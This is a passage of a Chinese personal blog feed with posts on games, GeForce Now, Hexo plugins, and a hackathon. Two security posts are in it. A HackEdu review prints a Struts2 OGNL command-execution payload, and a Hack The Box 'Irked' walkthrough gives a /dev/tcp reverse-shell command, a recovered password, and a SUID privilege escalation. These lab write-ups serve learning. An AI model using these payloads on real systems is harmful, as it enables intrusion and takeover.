其实在做羞耻事这点上，男人女人都一样，也正因为刚才被逼入羞耻至极的状态，一旦豁出去后，女人反能彻底抛开羞耻心和迷惘。虽说一开始是男人要侵犯女人，但彼此都达到高潮后，才发现被吸干榨尽的总是男人，在性事后男人就会像尸体般躺在床上。</p>
读者们可以自行比较一下区别。
<hr>
<p><a href="https://t.co/fKfoyRmtXl"> <img border="0" data-src="/static/images/galinsight-gift.png" /> </a></p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
      </tags>
  </entry>
  <entry>
    <title>Geforce Now Beta</title>
    <url>/posts/3f895d6c/</url>
    <content><![CDATA[<p>Geforce 还是很值得期待的。 <a id="more"></a></p>
<p>最近看到了Nvidia开发的Geforce Now（现在处于beta测试，免费使用），一款允许你在云端玩游戏的软件。这个技术也让我对于买什么样的电脑感到困惑。现在的电脑可以外置显卡，拥有了更强的扩展性。但是显卡还要散热，风扇会发出不小的声音。当电脑开了一个大游戏，就不太能再做点其他的事情了。下载游戏也需要不少时间。此时Geforce Now直接让你的电脑不要显卡了，多任务绝对没问题。开着Geforce Now就像开了一个视频。游戏也不要在本地下载和安装了。steam又有云备份功能。</p>
<p>现在的Geforce Now只支持有限的几十款游戏，都是育碧或steam的。在打开游戏的过程中，我碰到了一个小bug。Geforce Now 显示 <code>0x04010002</code>。我查了一下，还是从论坛上找到了解释。原因是电脑的显卡不支持H.264解码。 我用集成显卡运行Geforce Now就可以了。不过Nvidia自家的显卡不支持自家的软件，也是比较迷，或许是我的显卡过时了。</p>
<p>首先是测网速。Geforce Now目前只有美国和欧洲的服务器，中国裸连两百多的ping。（奇异的是Geforce就是不走代理，我用proxifer,Geforce Now直接提示我网络错误）经过我的测试，如果网速达到要求，玩游戏的时候画面还是一卡一卡的。那么八成就是丢包了。我们平时访问网页，如果某个tcp包丢了，服务器还会重发一个。然而Geforce Now用的是流传输。某一帧丢在路上就是丢在路上。总不成电脑画面都过了几十帧了，电脑又收到了服务器重发的那一个丢掉的帧。这样画面顺序就不对了。</p>
<p><img class="lazyload" data-src="/static/images/geforce1.png"></p>
<p>打开游戏，先是要登陆steam或者育碧。（感觉鼠标的延迟莫名的高）如果是steam的话，在库中下载要玩的游戏，接着打开。这样有几个缺点，第一个是如果mod特别多的话，服务器还需要下载一会。第二就是不方便打补丁。有些游戏没有官方中文，我们这时候会使用民间汉化补丁。这些补丁是需要手动打到游戏目录的。</p>
<p>游戏中使用鼠标箭头，会感觉非常卡。但是如果是把鼠标用在fps里瞄准，移动镜头倒是不卡。游戏运行的很流畅，开高配，顶配都没有问题。只是画面有时候很清楚，有时候很模糊。</p>
<hr>
<p><img class="lazyload" data-src="/static/images/geforcegift.jpg" sizes="50%"></p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Novelty</tag>
      </tags>
  </entry>
  <entry>
    <title>自动推送新博客的泛用实现方案</title>
    <url>/posts/a1b574bb/</url>
    <content><![CDATA[<p>这是一个适合大多数人的解决方案。它可以帮助你自动推送新博客给你的读者。有效提高网站的访问量。 <a id="more"></a> ## Intro ### 前情回顾 在 <a href="https://www.inevitable.tech/posts/98ae9e55/">Hexo 使用 Web Push Notification 浏览器通知推送</a> 中，我们讲到了 Web push notification 的好处，以及如何配置 <a href="https://www.webpushr.com/">Webpushr</a>。 在 <a href="https://www.inevitable.tech/posts/afd56cf2/">Auto web push notification</a> 中，我们讨论了自动推送通知的特殊解决方案。这个方案对于工具链有很多的局限性。网站源码必须在 Github 上，网站需要托管在 Netilfy 上，必须使用<code>hexo-abbrlink</code>这个插件。</p>
<p>在本篇文章中，我将给出一个更加泛用的解决方案。这次不再有那么的前提条件。唯一的前提条件是你需要注册 <a href="https://www.webpushr.com/">Webpushr</a>, 将你的网站加入到 Webpushr 中。你并不需要将 Webpushr 的 SDK 加入你的网站。这个插件会为你搞定一切。</p>
<p>如果你想使用其他的通知推送服务，请提交 <a href="https://github.com/glazec/hexo-web-push-notification/issues">Issue</a> 或者 <a href="https://github.com/glazec/hexo-web-push-notification/pulls">PR</a>。我们可以为其增加兼容性改进。</p>
<h2 id="原理">原理</h2>
<h3 id="想法">想法</h3>
<p>这一次我们只需要安装 <a href="https://github.com/glazec/hexo-web-push-notification">hexo-web-push-notification</a> 就可以解决所有问题。甚至 SDK 的集成也自动化了。</p>
<p>自动集成 SDK 很简单。将 SDK 代码直接插入渲染好的 HTML 中即可。</p>
<p>通知部分的想法与 <a href="https://www.inevitable.tech/posts/afd56cf2/">Auto web push notification</a> 一样。我们生成<code>newPost.json</code>。<code>newPost.json</code>包含了最新文章的信息。接着我们对比本地<code>newPost.json</code>与在线网站上的<code>newPost.json</code>。如果文章的 ID 有变化，那么我们就对读者进行通知推送。</p>
<h3 id="实现">实现</h3>
<p>除开简单的 SDK 自动集成，插件主要分为两部分。第一部分生成<code>newPost.json</code>。第二部分处理通知推送。</p>
<p>使用 Hexo Event，我们让第一部分在<code>hexo generate</code>之后执行。第二部分在<code>hexo deploy</code>之前执行。这个时候网站还没有进行更新。</p>
<h4 id="第一部分">第一部分</h4>
<p>第一部分所做的事情很简单。找到最新发布的文章，根据其信息生成<code>newPost.json</code>到本地<code>public/newPost.json</code>。以下是<code>newPost.json</code>的范例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;Auto web push notification&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;posts/afd56cf2/&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;date_published&quot;</span>: <span class="string">&quot;02/24/2020&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;summary&quot;</span>: <span class="string">&quot;如何自动通知读者有更新了？即只要正常更新博客，读者便可以在第一时间收到关于新文章的通知。&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://www.inevitable.tech/posts/afd56cf2/&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tags&quot;</span>: [<span class="string">&quot;hexo&quot;</span>, <span class="string">&quot;push notifications&quot;</span>, <span class="string">&quot;自动化&quot;</span>, <span class="string">&quot;CI&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;categories&quot;</span>: [<span class="string">&quot;开发&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一次，id 直接使用文章的路径。不管你怎么魔改 hexo，文章的路径永远具有唯一性。因此这次的解决方案适用范围更加广泛。</p>
<p>相比上一次的直接从源文件中读取数据进行处理。这一次的数据来自 Hexo API，加强了适用性。不管你的源文件长成什么样，只要 Hexo 能读懂，这个插件就能正常工作。</p>
<h4 id="第二部分">第二部分</h4>
<p>第二部分将本地<code>newPost.json</code>于网站上的<code>newPost.json</code>进行比对。如果文章 ID 不一样，那么便是作者进行了更新（没考虑过作者删除最新文章的可能性）。这个时候便触发通知推送。推送内容包含文章标题，链接以及节选。节选便是 Summary 部分。</p>
<h2 id="安装和使用">安装和使用</h2>
<p>想要自动推送通知，你得先得处理好 <a href="https://www.webpushr.com/">Webpushr</a>。你需要注册一个账号，加入你的网站，配置好 Safari 推送的证书，自定义请求通知弹窗的样式。具体可以参考 <a href="https://www.inevitable.tech/posts/98ae9e55/">Hexo 使用 Web Push Notification 浏览器通知推送中，</a>。</p>
<p>接下来的事情全交给<code>hexo-web-push-notification</code>。</p>
<p>安装这个插件，只需要执行<code>npm i hexo-web-push-notification --save</code>。</p>
<p>使用这个插件前记得添加以下配置到位于 hexo 根目录的<code>_config.yml</code>。 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">webPushNotification:</span></span><br><span class="line">  <span class="attr">webpushrKey:</span> <span class="string">&quot;your webpushr rest api key&quot;</span></span><br><span class="line">  <span class="attr">webpushrAuthToken:</span> <span class="string">&quot;your webpushr authorize token&quot;</span></span><br><span class="line">  <span class="attr">trackingCode:</span> <span class="string">&quot;AEGlpbdgvBCWXqXI6PtsUzobY7TLV9gwJU8bzMktrwfrSERg_xnLVbjpCw8x2GmFmi1ZcLTz0ni6OnX5MAwoM88&quot;</span></span><br></pre></td></tr></table></figure> <code>trackingCode</code>可能有点难找。打开 webpushr，进入到配置网站的主页。打开 Setup&gt;TrackingCode。<code>tracking code</code> 长这个样子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- start webpushr tracking code --&gt;</span><br><span class="line">&lt;script&gt;(<span class="function"><span class="keyword">function</span>(<span class="params">w,d, s, id</span>) </span>&#123;w.webpushr=w.webpushr||<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;(w.webpushr.q=w.webpushr.q||[]).push(<span class="built_in">arguments</span>)&#125;;<span class="keyword">var</span> js, fjs = d.getElementsByTagName(s)[<span class="number">0</span>];js = d.createElement(s); js.id = id;js.src = <span class="string">&quot;https://cdn.webpushr.com/app.min.js&quot;</span>;</span><br><span class="line">fjs.parentNode.appendChild(js);&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;webpushr-jssdk&#x27;</span>));</span><br><span class="line">webpushr(<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;AEGlpbdgvBCWXqXI6PtsUzobY7TLV9gwJU8bzMktrwfrSERg_xnLVbjpCw8x2GmFmi1ZcLTz0ni6OnX5MAwoM88&#x27;</span>);&lt;/script&gt;</span><br><span class="line">&lt;!-- end webpushr tracking code --&gt;</span><br></pre></td></tr></table></figure>
<p>最后第二行的<code>AEGlpbdgvBCWXqXI6PtsUzobY7TLV9gwJU8bzMktrwfrSERg_xnLVbjpCw8x2GmFmi1ZcLTz0ni6OnX5MAwoM88</code> 便是你的<code>trackingCode</code>。</p>
<p>更多安装指南请参考 <a href="https://github.com/glazec/hexo-web-push-notification">README.md</a>。</p>
<h2 id="后记">后记</h2>
<p>这是我第一次发行 NPM 包。我本来使用 Github 的包管理服务。但过程实在是有些麻烦。众所周知，发行包的第一步是<code>npm adduser</code>。如果是发行到 NPM 上，直接输入用户名和密码就行。但是如果是发行到 Github 上，密码得使用 Personal Access Token。生成 Personal Access Token 有点小麻烦。</p>
<p>包的名称似乎必须得是 Scoped。也就是包的名称必须得是作者名字开头。</p>
<p>成功发行到 Github 后，我遇到了不能下载的问题。使用<code>npm i</code>显示找不到我的包。可能运行<code>npm i</code>的时候，npm 在 NPM 上面找包，而不是 Github 上面找包。</p>
<p>鉴于以上并不是特别良好的体验，我想要删除这个包，将其在 NPM 上发行。看了一圈文档和别人的答案，删除包的唯一方法就是删除这个仓库。</p>
<p>最后，还是 NPM 香。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>push notifications</tag>
        <tag>自动化</tag>
        <tag>CI</tag>
      </tags>
  </entry>
  <entry>
    <title>HackEdu 试用</title>
    <url>/posts/ed65a4a4/</url>
    <content><![CDATA[<p>HackerOne的教学里推荐了HackEdu，一个类似教学靶场的东西。 <a id="more"></a></p>
<h2 id="初见">初见</h2>
<p>登陆后的主页经常刷不出来。只会有一个骨架屏在那，内容始终无法获得。看了一下Console，似乎是资源下载失败，大大的<code>404</code>在Console里打印出来。</p>
<p>这个网站主要提供教学式靶场。一个页面分为两部分，左边是教学，类似一些实验指导和漏洞的介绍。右边则是Web页面。这个靶场主要提供Web方向的漏洞。右边的Web页面上除了目标网站，还会有一些必要的小工具，比如Kali的虚拟机，已经构造好的上传文件。在Web页面的上方是拦截请求。Web页面的源码可以很容易的看见。有些时候甚至可以看到后端的代码。HackEdu还很良心的提供两种到三种不同语言的相同后端代码（竟然还有Python2.7）。使用者可以自行为这些后端代码打上补丁，之后再试一下漏洞还是否存在。这算是攻防一起锻炼了。</p>
<p>一年的订阅价格是750刀，HackerEdu主要的实验为OWASP Top10的漏洞，很少的原生App的实验（这个得订阅才能体验，我也没用过），一些公开的漏洞，还有比较拟真的CTF。</p>
<h2 id="cve-2018-1776">CVE-2018-1776</h2>
<p>我试了一下这个漏洞的实验。实验的步骤倒是不缺，由于跳过了环境配置的步骤，实验指南主要介绍背景知识，漏洞成因，和利用。</p>
<p>由于这是一个关于Struts2 NameSpace和 OGNL的漏洞，指南里便介绍了一下这两个概念。我感觉解释的并不够详细。例子是有，但是对例子没有解释。</p>
<p>漏洞的成因也是将流程和逻辑上的原因讲解了一下，并没有深入到源码上。对于Apache的补丁也是顺口带了一句。</p>
<p>漏洞的利用提供了手动和自动两种方式，提供了Payload，但是对Payload没有任何的解释。我看的是一脸懵逼。 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true).(#cmd&#x3D;&#39;hostname&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;c&#39;,#cmd&#125;:&#123;&#39;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros )).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure> 总体来说，说明不够清楚（虽然在开头有一个到报告的链接），实验部分并没有什么出彩的地方。这个实验并不能看到后端的代码。还是希望深度能有所加深，并不是停留在简单Exploit的层面。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>HackShanghai</title>
    <url>/posts/16e1dbdf/</url>
    <content><![CDATA[<p>简简单单的第一次Hackthon。 <a id="more"></a></p>
<p>这是我第一次参加Hackthon。嘛，hackthon很累，但是也很有乐趣。有了24小时的限制，你才会知道你的极限效率在哪里。</p>
<p>这次是Hackthon的场地是在，上科大。由于我弄错了签到时间，当其他选手在听赞助商长篇大论的广告时，我还在星巴克吃着早饭。慢悠悠的来到场地，等待我的是还有1个半小时的广告。</p>
<p>没想到有这么多补签的人。散会后，签到处排起了长龙。每一个窗口都只有一个人宽的队伍，窗口与窗口密集的并在一起。这就是问题啊。当你排到队伍第一个，签完到后，惊喜随之而来-四周都是人，根本走不出去。</p>
<p>这次的Hackthon是提供了一个一个的小房间，有的房间只能容纳6个队伍，有的可以容纳十几个队伍。我也是可以感受到那种有趣的气氛，大家都在做着自己的项目，努力为自己的项目添色。</p>
<p>我们组的项目可以说是先天不足了。是一个在妥协的情况下产生的原型，四处的棱角已经被打磨平整，没有吸引人眼球的特色。虽然它的确相比其他原型更加地贴近现实，但是在放弃了特色之后，仍有一些硬伤是无法避免的。如果还有下一次，我肯定选择成为风口上的猪，选择热点，把我项目的特色给做出来。黑客之所以是黑客，是因为他们有着比环境创造者对环境更熟悉的性质。或许在这，创造者的代表便是评委。</p>
<p>项目的实施也有一些问题。我写后端。一个队友写前端，还有一个做ui设计。我们在有有限的时间内，以项目工作流程为顺序开始实现项目。一般应用的第一个流程是什么？注册，登录，重置密码。我们用了大半个晚上来做登录(这个与核心业务逻辑无关的东西)。最后惊奇的发现前端调用后端api一直有问题。后端读取前端的数据包时,出现了错误。经常是读不到数据。我自己本地做测试的时候，api是没有问题的。我个人觉得问题时出在前端发送数据包上。或许应该用jquery来沟通react和django。</p>
<p>到了这一步，的确。我们两个写的程序还不如ui的工作流程图好用。</p>
<p>值得一提的是我有一个队友来自RSID的工业设计系。他有一个很好的习惯，随身带着一只水笔，一本本子。看到了什么，拿出本子画一画。几笔下去，一个或夸张或灵活的形象跃然纸上。又或随手记下几个要点，几许灵感。纸终究与屏不同，我喜欢这种习惯或者说这种习惯所带来的构建属于自己的世界的感觉。</p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>Hackthon</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Cheatsheets Theme</title>
    <url>/posts/59f1905d/</url>
    <content><![CDATA[<p>哪个男孩不想拥有属于自己的屠龙宝典呢？ <a id="more"></a> ## 起因 现在工具那么多，往往完成一件事情需要很多种工具的配合。尤其是安全渗透领域，各种各样的工具有着自己的特点。对于新手，记住每个工具的常用命令往往是最难得。比如我每次都忘记Nmap的常用命令。GDB的常用命令也总是记不住。</p>
<p>为了想要记住这些常用的命令，Cheatsheets出现了。但是很难在一个站点的Cheatsheets中找到我需要的全部软件。而且每个人用工具的方式都是不一样的，有可能在一张Cheatsheets中，有百分之五十的命令都是我不需要的。很多流行的Cheatsheets都因为这个原因而显得太臃肿。</p>
<p>因此谁不想要一个为自己量身定制的Cheatsheets呢？</p>
<h2 id="介绍">介绍</h2>
<p><a href="https://github.com/glazec/hexo-Cheatsheets">Hexo Cheatsheets</a>可以帮助你使用Hexo快速的搭建一个属于自己的Cheatsheets。</p>
<center>
<img class="lazyload" data- data-src="/static/images/hexoCheatsheets2.webp" height="80%" width="80%">
</center>
<br>
<center>
<img class="lazyload" data- data-src="/static/images/hexoCheatsheets1.webp" height="80%" width="80%">
</center>
<h2 id="安装">安装</h2>
<p>安装这个Cheatseets跟安装一个Hexo Theme没什么区别。</p>
<p>首先你得有<a href="https://hexo.io/zh-cn/docs/">Hexo</a>工程文件夹。然后将<a href="https://github.com/glazec/hexo-Cheatsheets">Hexo Cheatsheets</a> 下载到 <code>themes/</code>，并且将下载下来的文件夹从<code>hexo-cheatsheets</code>改名为<code>cheatsheets</code>。</p>
<p>打开Hexo工程文件夹下的<code>_config.yml</code>，将里面<code>themes</code>的值改为<code>cheatsheets</code>。更改后的样子是<code>themes: cheatsheets</code>。</p>
<p>这样就算是安装完成了。</p>
<h2 id="使用">使用</h2>
<p>在<code>source/_posts</code>下创建新的Cheatsheets。</p>
<p><code>front-matter</code>中<code>title</code>对应着标题;<code>categories</code>对应着主页上的分类；<code>version</code>对应着撰写Cheatsheets所使用的软件的版本号。</p>
<p>正文的第一个非空白行必须是<code>## get started</code>。接下来可以自用使用<code>##</code>和<code>###</code>作为标题。</p>
<p>所有代码必须按照markdown格式进行书写，并且需要标注所使用的语言，不然无法进行高亮。以下是正确写法。</p>
<center>
<img class="lazyload" data- data-src="/static/images/hexoCheatsheets3.webp" height="30%" width="30%">
</center>
<p><br></p>
<p>我上传了一个<a href="https://github.com/glazec/hexo-Cheatsheets">工程文件</a>作为demo。里面有几个posts可以作为格式参考。</p>
<h2 id="开发历程">开发历程</h2>
<p>外观我直接套用了<a href="devhints.io">Devhints</a>。Devhints是基于Jeklly。也就是我将其移植到了Hexo。但是由于我对前端不怎么了解，Devhint项目中的打包逻辑我并没有看懂。因此移植过程中可能丢失或多出了一些文件。</p>
<p>除了单纯的拷贝CSS和JS，Hexo生成静态文件的方式和Jeklly不怎么一样。为了尽可能少的改动CSS（因为我不太会),我用了万能的JS胶水。通过改动DOM，添加Class达成了CSS零改动。</p>
<p>但是对于这样强行移植的可维护性我还是抱有怀疑。可能等我之后添加Feature或者优化性能的时候，问题才会真正的浮现出来。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>cheatSheets</tag>
      </tags>
  </entry>
  <entry>
    <title>htoL#NiQ</title>
    <url>/posts/7a7a890e/</url>
    <content><![CDATA[<p>htoL#NiQ:The Firefly Diary 千万不要像我一样被可爱的小萝莉骗进这个游戏。。 <a id="more"></a></p>
<p>萤火虫日记是一款来自日本的横版解密独立游戏。它有着新颖的玩法，和可爱的小萝莉。（画风我很喜欢）在整个游戏中，玩家需要利用光与影来解密。玩家控制的不是小萝莉Mion，而是两只萤火虫：绿色的代表光，紫色的代表影。Mion会跟着萤火虫行动。整个游戏的画风偏暗，使得血色更加的鲜艳。看见Mion一次次的死亡，屏幕上一朵又一朵血花的绽放，我感受到浓浓的愧疚与罪恶。</p>
<p><img class="lazyload" data-src="/static/images/htoLNiQ1.jpg"></p>
<p>萤火虫日记独特的操控方式也给这款游戏带来了不小的难度---延迟。玩家操控萤火虫，Mion跟着萤火虫行动。这样的机制导致了高延迟的产生。然而这款游戏又是容错率较小的游戏，玩家只能一次又一次的尝试知道崩溃弃坑。感觉到了制作者弄弄的恶意，<strong>硬生生的提高了难度</strong>。这个游戏解密的难度并不大，难得就是操作。我按着攻略，还是花了十个小时才打通了游戏。</p>
<p><img class="lazyload" data-src="/static/images/htoLNiQ2.jpg"></p>
<p>我个人感觉这款游戏不看攻略是很难打下去的。整款游戏讲述的是Mion寻找自己的过去。在游戏中玩家需要收集记忆碎片，包含着主角的回忆。当你寻找到了所有的记忆碎片才可以开启隐藏关卡。问题是每一关的操作难度都很大，我并不愿意重复任何一个关卡（真的难）。因此我只能看着攻略，第一次通关就中找到记忆碎片。不得不提游戏的最后第几关，难度实在是大。</p>
<p>看到这个带问号的门了吗？你并不知道每扇门是通向哪里，有的门还是单向的，走错了就回不来了。玩家也不知道目的地在哪，只能漫无目的的走。攻略上一共有二三十个步骤。真是不知道不看攻略的玩家是花了多长时间打通了这关，并且收集到了记忆碎片的（这一关的记忆碎片需要多将近十个步骤）。我按照攻略走，也晕的不行。我走错了2次，一共尝试了4次才通过这一关。</p>
<p><img class="lazyload" data-src="/static/images/htoLNiQ3.png"></p>
<p>最后一关非常的考验眼力。一开始三张牌会展示给玩家看，其中一张是有人物的。接下来便是耳熟能详的把戏。洗牌，猜测哪一张上有人物。后面的速度实在是太快了，一不留神，或者盯得太紧，眼睛一花。接下来遍全靠猜了。猜错一次，屏幕上会出现混乱的像素。原本就看不清的牌，就更加看不清了。</p>
<p>另一个便是一个影子会从帷幕的缝隙间快速穿过，玩家需要从四个影子中选择出真正的影子。我一度怀疑这个速度超出了人类动态视力所能捕捉的极限。到了后期，我只能看见一个模糊的影子。通关全靠运气。</p>
<p>收集完所有记忆碎片并不是自动解锁隐藏关卡。而是需要进入Event4取出钥匙，再前往秘密实验室所在的关卡（隐藏关卡竟然是难度及其高的植物大战僵尸）。这一些在最后一个记忆碎片都有提示。但是我没有看出来，还傻乎乎的又看了一遍所有的记忆碎片。</p>
<p><img class="lazyload" data-src="/static/images/htoLNiQ4.jpg"></p>
<p>整个游戏并没有多少文字，完全没有必要上个汉化补丁。我看了许多关于剧情的分析，大家都是基于记忆碎片，过场动画以及结尾进行猜测。不同的分析有着不小的区别。打完整个游戏，我一脸懵逼。真的是不知道这个游戏想要讲一个什么样的故事。我所看出来的最关键的便是萤火虫是父母变的。至于哪个淤泥一样的怪物，mion头上戴的鹿角是什么，为什么会有两个mion，mion又为什么会在地下醒来。我真的是没有看出来。</p>
<p>这个游戏的开发商还做过其他关于小萝莉的游戏。但是千万不要看见小萝莉，手一抖就购买了游戏。打完萤火虫日记后，我痛定思痛又购买了夜回。这回是恐怖游戏。这游戏玩起来真的是刺激。。。手电筒只能照亮约45°的范围，怪物只有被手电筒照亮才会显形。那么怎么知道身边有怪物呢？有怪物在身边，玩家会听到心跳声。怪物越近，心跳声越快，而且主角走的越慢。然后，我就听见一个像是什么东西被撕裂的声音，黑色的屏幕上溅满了鲜血（这一作的鲜血比萤火虫日记中的鲜血做的更加细腻）。本就是昏暗的场景设计凸显出了鲜血的鲜艳。这个游戏打起来真的很刺激，尤其是强有力的心跳声给我了很强的紧迫感。</p>
<p>还有一款A Rose in twilight。这一次回归横版解密游戏。操作难度下降了不少，但还是一贯的风格。小萝莉加上鲜艳的血色。这一次还增加了自杀和处刑。看着小萝莉一脸无辜的走上不同的处刑台，东张西望，绝望的表情。最后的结果终究是血。</p>
求贵社少虐萝莉。
<hr>
<p><img class="lazyload" data-src="/static/images/htoLNiQ5.jpg"></p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack the box-Irked</title>
    <url>/posts/4054467b/</url>
    <content><![CDATA[<p>HTB的irked并不算难，跟评分挺符合的。 <a id="more"></a></p>
<h2 id="信息收集">信息收集</h2>
<p>服务器的网页上有一张图片和一行文字。文字表示这个服务器上运行着IRC服务。</p>
<p>用Nmap扫描一下。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 10.10.10.117 -sS -oN portScan -A</span><br></pre></td></tr></table></figure> 扫描报告并没有出现之前提到的IRC服务。再次对服务器进行一次更加全面的端口扫描。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 10.10.10.117 -p- -sC -sV -oN fullScan</span><br></pre></td></tr></table></figure> 这次发现了两个运行着IRC服务的端口。8057和6697。 尝试去连接IRC服务。查阅一下IRC的<a href="https://tools.ietf.org/html/rfc1459#page-14">通讯协议</a>,需要发送PASS，NICK，USER的信息。</p>
<p>先使用ncat连接上服务器，再按照协议中的规范将指定信息发送给服务器。这样就可以连接上IRC服务器，并且服务器会返回IRC的版本和型号。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<p>搜索一下版本和型号，会找到现成的<a href="https://lwn.net/Articles/392201/">漏洞</a>。</p>
<h3 id="metasploit">Metasploit</h3>
<p>可以直接使用Metasploit进行漏洞利用。如果是docker的话，需要设置一下LHOST。因为exploit默认的LHOST是错误的，所以第一次反向shell会失败。只有在第一次失败后，才可以更改LHOST。</p>
<h3 id="手动利用漏洞">手动利用漏洞</h3>
<p>这个漏洞的利用非常的简单。将<code>AB</code>传给IRC，IRC便会将之后的字符当作命令执行。 构建一个反向shell的payload。</p>
<p>监听本地端口 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat -lvnp yourport</span><br></pre></td></tr></table></figure> 发送shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;AB;bash -c&#x27;bash -i &amp;&gt; /dev/tcp/yourip/yourport 0&amp;&gt;1&#x27;&quot;</span>| ncat 10.10.10.117 8067</span><br></pre></td></tr></table></figure> 在payload外面套用一次bash的原因是 <code>/dev/tcp/yourip/yourport</code>是bash的特性，在其他的终端中无法使用。 具体参数的含义可以在这里<a href="https://blog.csdn.net/ithomer/article/details/9288353">查看</a>。</p>
<h3 id="升级shell">升级shell</h3>
<p>现在的反向shell非常的简陋，可以给他升一下级。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pyt;pyt.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<p>这会在一个新的进程中创建一个bash。 接下来的升级步骤跟stty有关，由于docker无法使用<code>control+z</code>的快捷键，接下来的升级步骤我便没有继续下去。 参考： https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic</p>
<h3 id="提权">提权</h3>
<p>在<code>/home/djmardov/Documents/</code>下可以找到user.txt文件，虽然没有没有权限读取他，但在相同的目录下，有一份隐藏的备份文件。在隐藏文件<code>.backup</code>里面有这样的提示： <figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Super elite steg backup pw</span></span><br><span class="line"><span class="attribute">UPupDOWNdownLRlrBAbaSSss</span></span><br></pre></td></tr></table></figure> 里面提到了steg，隐写术。网站上是不是有一个图片？user.txt里面是不是有像密码一样的东西？ <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">steghide <span class="keyword">extract </span>-sf irked.<span class="keyword">jpg </span>-p UPupDOWNdownLRlrBAbaSSss</span><br></pre></td></tr></table></figure> 这样就获得了密码：Kab6h+m+bbp2J:HG。</p>
<p>接下来可以直接用ssh登录，不再用哪个简陋的shell。 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> djmardov@<span class="number">10.10.10.117</span></span><br><span class="line"><span class="attribute">Kab6h</span>+m+bbp<span class="number">2</span>J:HG</span><br></pre></td></tr></table></figure> 之前的文件里有pw的提示，所以提权的方式是利用一个权限设置不恰当的文件。文件的owner为root，但是用户执行时以root权限运行。</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/ -​type​ f -perm -4000 2&gt;/</span>dev/<span class="keyword">null</span> </span><br></pre></td></tr></table></figure>
<p>perm 4000的意思时寻找权限为setuid的文件，即用户可以以root权限执行的文件。 <code>2&gt;/dev/null</code>会把所有报错信息（Permission Denied）过滤掉。</p>
<p>参考： https://www.tutonics.com/2012/12/find-files-based-on-their-permissions.html https://developer.ibm.com/tutorials/l-lpic1-104-5/</p>
<p>除去linux自带的文件，有一个奇特的文件viewuser。可以用ltrace和strace进行逆向分析一下，发现它会以root权限去执行<code>/tmp/listusers</code>中的命令。</p>
<p>创建<code>/tem/listusers</code>，并且写入<code>/bin/bash</code>,给文件加上执行权限。再次执行viewuser，我们便有了root权限。</p>
<h3 id="总结">总结</h3>
<p>Irked并不算难。需要枚举找到正确的漏洞，漏洞的利用都可以自动化完成。提权的操作也比较常规，只要会枚举，完成实验难度不大。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>基本穿搭 大山旬</title>
    <url>/posts/f351a3b6/</url>
    <content><![CDATA[<p>很基本的穿搭。 <a id="more"></a> &gt; 这本书,对我们那些互联网行业的同行们尤其有现实意义。多少程序员、PM 拿着五位数工资,穿衣风格还停留在高中生水平,甚至很多理论上靠设计吃饭的设计师,也穿得一言难尽。- <span class="citation" data-cites="nishuang">@nishuang</span></p>
